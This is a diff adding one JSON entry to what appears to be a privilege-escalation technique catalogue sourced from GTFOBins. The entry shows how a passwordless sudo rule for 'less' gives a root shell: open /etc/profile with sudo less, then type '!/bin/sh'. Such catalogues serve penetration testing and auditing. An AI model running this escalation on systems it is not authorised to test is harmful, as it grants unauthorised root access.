@@ -1,0 +1,1 @@
+{"id":"sudo_less","category":"SUDO_NOPASSWD_CUSTOM","binary":"less","cve":null,"exploitation":["sudo {{binary}} /etc/profile"],"post_exploit":["id"],"notes":"After less opens, type !/bin/sh. Interactive pager.","source":"gtfobins.github.io","tags":["sudo","nopasswd","gtfobins","interactive"],"severity":"high"}
